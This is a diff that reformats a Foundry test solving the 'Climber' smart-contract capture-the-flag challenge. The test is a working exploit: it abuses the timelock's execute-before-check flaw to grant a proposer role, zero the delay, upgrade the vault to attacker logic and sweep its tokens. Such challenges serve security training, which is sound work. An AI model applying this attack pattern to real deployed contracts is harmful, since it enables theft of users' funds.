@@ -89,45 +89,29 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-
         bytes32 salt = keccak256("attack proposal");
         bytes memory emptyBytes;
 
         // Deploy our attacking contract
-        AttackTimelock attackContract = new AttackTimelock(
-            address(vault),
-            payable(address(timelock)),
-            address(token),
-            player);
+        AttackTimelock attackContract =
+            new AttackTimelock(address(vault), payable(address(timelock)), address(token), player);
 
         // Deploy contract that will act as new logic contract for vault
         BuggyVault buggyVault = new BuggyVault();
 
         // Set proposal rule to the timelock contract
-        bytes memory grantRoleData = abi.encodeWithSignature(
-            "grantRole(bytes32,address)", 
-            PROPOSER_ROLE,
-            attackContract
-        );
+        bytes memory grantRoleData =
+            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, attackContract);
 
         // Update delay to 0
-         bytes memory updateDelayData = abi.encodeWithSignature(
-            "updateDelay(uint64)", 
-            0
-        );
+        bytes memory updateDelayData = abi.encodeWithSignature("updateDelay(uint64)", 0);
 
         // Call to the vault to upgrade to attacker controlled contract logic
-        bytes memory upgradeData = abi.encodeWithSignature(
-            "upgradeToAndCall(address,bytes)", 
-            address(buggyVault),
-            emptyBytes
-        );
+        bytes memory upgradeData =
+            abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(buggyVault), emptyBytes);
 
         // Call Attacking Contract to schedule these actions and sweep funds
-        bytes memory exploitData = abi.encodeWithSignature(
-            "exploit()"
-        );
-
+        bytes memory exploitData = abi.encodeWithSignature("exploit()");
 
         address[] memory targets = new address[](4);
         uint256[] memory emptyData = new uint256[](4);
@@ -150,24 +134,14 @@ contract ClimberChallenge is Test {
         dataElements[3] = exploitData;
 
         // Set our 4 calls to attacking contract
-        attackContract.setScheduleData(
-            targets,
-            dataElements
-        );
+        attackContract.setScheduleData(targets, dataElements);
 
         vm.warp(block.timestamp + 1);
         // execute the 4 calls
-        timelock.execute(
-            targets,
-            emptyData,
-            dataElements,
-            salt
-        );
+        timelock.execute(targets, emptyData, dataElements, salt);
 
         // Withdraw our funds from attacking contract
         attackContract.withdraw(recovery);
-
-           
     }
 
     /**
